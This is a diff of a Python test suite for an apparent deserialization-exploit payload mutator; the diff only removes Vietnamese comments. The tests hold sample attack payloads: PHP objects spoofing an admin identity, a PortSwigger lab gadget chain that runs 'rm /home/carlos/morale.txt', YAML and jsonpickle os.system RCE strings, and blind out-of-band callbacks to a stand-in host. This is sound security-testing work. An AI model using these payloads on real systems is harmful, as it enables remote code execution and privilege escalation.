@@ -47,28 +47,20 @@ class TestModifyStringTargetsValuesNotKeys(unittest.TestCase):
         self.assertTrue(any('"administrator"' in p and 's:8:"username";s:13:"administrator"' in p for p in payloads))
 
     def test_exact_mutation_count_is_four_not_eleven(self):
-        # Truoc fix: 11 mutation (7 sai vi dam key/value). Sau fix: dung 4
-        # (chi doi gia tri "wiener", bo qua gia tri trung "admin").
         results = mutate(self.REAL_PORTSWIGGER_PAYLOAD, "modify_string", "Identity Spoofing")
         self.assertEqual(len(results), 4)
 
     def test_embedded_quote_inside_string_value_does_not_break_parsing(self):
-        # Gia tri PHP string CHUA dau ngoac kep ben trong (hop le, length-prefixed)
         inner = 'a"b"c"d"e'
         payload = f'a:1:{{s:8:"username";s:{len(inner)}:"{inner}";}}'
         results = mutate(payload, "modify_string")
         payloads = decoded_payloads(results)
         self.assertEqual(len(payloads), 4)
         for p in payloads:
-            # Payload mutate ra phai la PHP serialize HOP LE - khong con dinh
-            # rac cua noi dung cu (vd "c"d"e" khong duoc xuat hien lac long)
             self.assertTrue(p.endswith(";}"), f"Payload hong cu phap: {p!r}")
             self.assertNotIn('"c"d"e"', p)
 
     def test_nested_object_with_no_matching_field_produces_no_mutation(self):
-        # Payload that tu lab PortSwigger "Developing a custom gadget chain
-        # for PHP deserialization" - co object O:... long ben trong, nhung
-        # KHONG field nao (o bat ky tang nao) khop hint username/admin/...
         payload = ('O:14:"CustomTemplate":2:{s:17:"default_desc_type";'
                    's:26:"rm /home/carlos/morale.txt";s:4:"desc";'
                    'O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}')
@@ -76,22 +68,16 @@ class TestModifyStringTargetsValuesNotKeys(unittest.TestCase):
         self.assertEqual(results, [])
 
     def test_nested_object_field_is_now_recursed_into_and_mutated(self):
-        # Field "role" nam LONG BEN TRONG object con "Profile" (khong phai
-        # top-level) - phai duoc _iter_php_pairs() de quy vao moi thay va
-        # mutate duoc (truoc day bi bo qua hoan toan vi container duoc coi
-        # la "opaque", chi lay span roi bo qua khong doc noi dung ben trong).
         payload = ('O:4:"User":1:{s:7:"profile";'
                    'O:7:"Profile":1:{s:4:"role";s:4:"user";}}')
         results = mutate(payload, "modify_string")
         mutated = decoded_payloads(results)
-        self.assertEqual(len(mutated), 4)  # administrator/admin/root/superuser, khong cai nao trung "user"
+        self.assertEqual(len(mutated), 4)
         for p in mutated:
-            self.assertIn('s:7:"profile"', p)  # key ngoai giu nguyen
-            self.assertNotIn('s:4:"user"', p)  # gia tri "role" da bi doi
+            self.assertIn('s:7:"profile"', p)
+            self.assertNotIn('s:4:"user"', p)
 
     def test_key_name_containing_hint_word_is_not_itself_mutated(self):
-        # Class name "User" tinh co chua tu "user" - dam bao field KEY
-        # "username" khong bi coi la target du no nam gan text co "user".
         results = mutate(self.REAL_PORTSWIGGER_PAYLOAD, "modify_string", "Identity Spoofing")
         for p in decoded_payloads(results):
             self.assertTrue(p.startswith('O:4:"User":2:{s:8:"username";'),
@@ -131,8 +117,6 @@ class TestFlipBooleanIsolatesEachField(unittest.TestCase):
         self.assertTrue(payloads[0].endswith('b:1;}'))
 
     def test_boolean_field_nested_inside_object_is_now_found_and_flipped(self):
-        # "admin" nam trong object con "Profile", khong phai top-level cua
-        # "User" - _iter_php_pairs() phai de quy vao moi thay duoc.
         payload = ('O:4:"User":1:{s:7:"profile";'
                    'O:7:"Profile":1:{s:5:"admin";b:0;}}')
         results = mutate(payload, "flip_boolean")
@@ -147,19 +131,16 @@ class TestModifyIntegerUsesPositionalReplace(unittest.TestCase):
         payload = 'a:2:{s:5:"level";i:5;s:5:"score";i:5;}'
         results = mutate(payload, "modify_integer")
         payloads = decoded_payloads(results)
-        # Moi field i:5 (2 cai) x 5 gia tri trong int_values (khong cai nao = 5)
-        # = 10 mutation, va tung mutation chi doi DUNG 1 trong 2 vi tri.
         self.assertEqual(len(payloads), 10)
         for p in payloads:
             self.assertEqual(p.count("i:5;"), 1, f"Phai con dung 1 vi tri i:5; chua doi: {p!r}")
 
     def test_integer_field_nested_inside_object_is_now_found_and_mutated(self):
-        # "level" nam trong object con "Profile", khong phai top-level.
         payload = ('O:4:"User":1:{s:7:"profile";'
                    'O:7:"Profile":1:{s:5:"level";i:1;}}')
         results = mutate(payload, "modify_integer")
         payloads = decoded_payloads(results)
-        self.assertEqual(len(payloads), 4)  # int_values = [1,2,99,100,9999], tru gia tri goc 1
+        self.assertEqual(len(payloads), 4)
         for p in payloads:
             self.assertIn('s:7:"profile"', p)
             self.assertNotIn("i:1;", p)
@@ -188,16 +169,15 @@ class TestYamlMutationRespectsJavaVsPython(unittest.TestCase):
 
     def test_python_exploit_type_still_gets_python_payload(self):
         import tool_config
-        tool_config.set_oob_override("oob.test.local")   # make OOB variant deterministic
+        tool_config.set_oob_override("oob.test.local")
         try:
             results = mutate("!!python/object/apply:os.system ['id']", "yaml_exec", "YAML Python RCE")
         finally:
             tool_config.set_oob_override(None)
         rce = [r for r in results if r.get("type") == "yaml_rce"]
-        self.assertEqual(len(rce), 3)  # 1 cho moi TEST_COMMANDS
+        self.assertEqual(len(rce), 3)
         for payload in decoded_payloads(rce):
             self.assertIn("!!python/object/apply:os.system", payload)
-        # blind OOB variant: pure-Python urllib callback (no local command)
         oob = [r for r in results if r.get("type") == "yaml_oob"]
         self.assertEqual(len(oob), 1)
         self.assertIn("urllib.request.urlopen", decoded_payloads(oob)[0])
@@ -244,10 +224,6 @@ class TestJavaRceEscalation(unittest.TestCase):
 
     @patch("Analyze.payloadMutation.get_oob_domain", return_value="")
     def test_mutate_dispatch_calls_both_urldns_and_escalation(self, _mock):
-        # Ep ca 2 nhanh ve chung 1 duong (jar khong ton tai) de test khong
-        # phu thuoc may dang chay co "java" tren PATH hay khong - diem can
-        # kiem tra o day la dispatch co goi CA HAI ham, khong chi urldns don
-        # le (truoc fix chi co 1 dong "return self._mutate_java_urldns()").
         pm = self._pm()
         pm.YSOSERIAL_PATH = "tools/java/this-file-does-not-exist.jar"
         with patch.object(pm, "_mutate_java_urldns", wraps=pm._mutate_java_urldns) as spy_urldns, \
@@ -282,8 +258,6 @@ class TestPhpTypeJuggling(unittest.TestCase):
         )
 
     def test_no_type_juggle_on_gadget_chain_without_token_field(self):
-        # CustomTemplate RCE payload co string field nhung KHONG field token/secret nao
-        # -> type juggling khong duoc kich hoat (bien chuoi thanh 0 la vo nghia o day).
         payload = ('O:14:"CustomTemplate":2:{s:17:"default_desc_type";'
                    's:26:"rm /home/carlos/morale.txt";s:4:"desc";'
                    'O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}')
@@ -310,7 +284,6 @@ class TestPythonBlindOobVariants(unittest.TestCase):
         self.assertIn(b"http://oob.test.local/tok1/", raw)
 
     def test_no_oob_variant_when_oob_not_configured(self):
-        # payloadMutation imported get_oob_domain by name, so patch it there.
         with patch("Analyze.payloadMutation.get_oob_domain", return_value=""):
             results = mutate("gASV...", "pickle_exec", "Python Pickle")
         self.assertFalse(any(r.get("type") == "pickle_oob" for r in results))
@@ -328,7 +301,7 @@ class TestJsonpickleMutations(unittest.TestCase):
         for payload in decoded_payloads(results):
             self.assertIn('"py/reduce"', payload)
             self.assertIn("os.system", payload)
-            self.assertNotIn("gASV", payload)  # not a binary pickle
+            self.assertNotIn("gASV", payload)
 
     def test_jsonpickle_exec_adds_oob_variant_when_configured(self):
         import tool_config
